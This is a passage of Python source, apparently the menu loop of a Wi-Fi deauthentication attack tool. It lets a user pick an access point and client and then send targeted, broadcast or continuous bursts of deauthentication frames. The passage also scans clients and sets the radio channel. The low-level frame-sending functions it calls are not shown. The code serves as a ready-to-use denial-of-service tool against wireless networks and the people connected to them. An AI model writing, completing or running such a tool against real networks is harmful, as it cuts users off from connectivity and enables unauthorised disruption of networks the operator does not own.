                idx = int(sel) - 1
                if 0 <= idx < len(nets):
                    selected_bssid = nets[idx]['bssid']
                    deauth.print_status(
                        f"Target: {nets[idx]['ssid']} ({selected_bssid})", "success"
                    )
            except ValueError:
                pass

        elif choice == '3':
            if not selected_iface:
                deauth.print_status("Select an interface first", "warning")
                continue
            dur = input("Scan duration (seconds) [10]: ").strip()
            dur = int(dur) if dur.isdigit() else 10
            deauth.print_status(
                f"Scanning clients{' on ' + selected_bssid if selected_bssid else ''}...",
                "info"
            )
            clients = deauth.scan_clients(selected_iface, selected_bssid, dur)
            if not clients:
                deauth.print_status("No clients found", "warning")
                continue
            print(f"\n{'#':<4} {'Client MAC':<20} {'AP BSSID':<20} "
                  f"{'Signal':<8} {'Packets'}")
            for i, c in enumerate(clients):
                print(f"{i+1:<4} {c['client_mac']:<20} {c['ap_bssid']:<20} "
                      f"{c['signal']:<8} {c['packets']}")
            sel = input(f"\nSelect client (1-{len(clients)}, Enter for broadcast): ").strip()
            try:
                idx = int(sel) - 1
                if 0 <= idx < len(clients):
                    selected_client = clients[idx]['client_mac']
                    if not selected_bssid:
                        selected_bssid = clients[idx]['ap_bssid']
                    deauth.print_status(f"Client: {selected_client}", "success")
            except ValueError:
                selected_client = None

        elif choice == '4':
            if not selected_iface or not selected_bssid:
                deauth.print_status("Select interface and target AP first", "warning")
                continue
            client = selected_client or input("Client MAC (Enter for broadcast): ").strip()
            if not client:
                client = BROADCAST
            cnt = input("Frame count [10]: ").strip()
            cnt = int(cnt) if cnt.isdigit() else 10
            deauth.print_status(f"Sending {cnt} deauth frames...", "info")
            r = deauth.deauth_targeted(selected_iface, selected_bssid, client, cnt)
            if r['ok']:
                deauth.print_status(
                    f"Sent {r['frames_sent']} frames in {r['duration']}s", "success"
                )
            else:
                deauth.print_status(r['error'], "error")

        elif choice == '5':
            if not selected_iface or not selected_bssid:
                deauth.print_status("Select interface and target AP first", "warning")
                continue
            cnt = input("Frame count [10]: ").strip()
            cnt = int(cnt) if cnt.isdigit() else 10
            deauth.print_status(f"Broadcasting {cnt} deauth frames...", "info")
            r = deauth.deauth_broadcast(selected_iface, selected_bssid, cnt)
            if r['ok']:
                deauth.print_status(
                    f"Sent {r['frames_sent']} frames in {r['duration']}s", "success"
                )
            else:
                deauth.print_status(r['error'], "error")

        elif choice == '6':
            if not selected_iface or not selected_bssid:
                deauth.print_status("Select interface and target AP first", "warning")
                continue
            client = selected_client or BROADCAST
            intv = input("Interval between bursts (seconds) [0.5]: ").strip()
            intv = float(intv) if intv else 0.5
            bst = input("Burst size [5]: ").strip()
            bst = int(bst) if bst.isdigit() else 5
            r = deauth.start_continuous(
                selected_iface, selected_bssid, client, intv, bst
            )
            if r['ok']:
                deauth.print_status(r['message'], "success")
            else:
                deauth.print_status(r['error'], "error")

        elif choice == '7':
            r = deauth.stop_continuous()
            if r['ok']:
                deauth.print_status(
                    f"Stopped. {r['frames_sent']} frames in {r['duration']}s",
                    "success"
                )
            else:
                deauth.print_status(r.get('error', 'No attack running'), "warning")

        elif choice == '8':
            if not selected_iface:
                deauth.print_status("Select an interface first", "warning")
                continue
            ch = input("Channel (1-196): ").strip()
            try:
                ch = int(ch)
                r = deauth.set_channel(selected_iface, ch)
                if r['ok']:
                    deauth.print_status(r['message'], "success")
                else:
                    deauth.print_status(r['error'], "error")
            except ValueError:
                deauth.print_status("Invalid channel number", "error")

        else:
            deauth.print_status("Invalid choice", "warning")
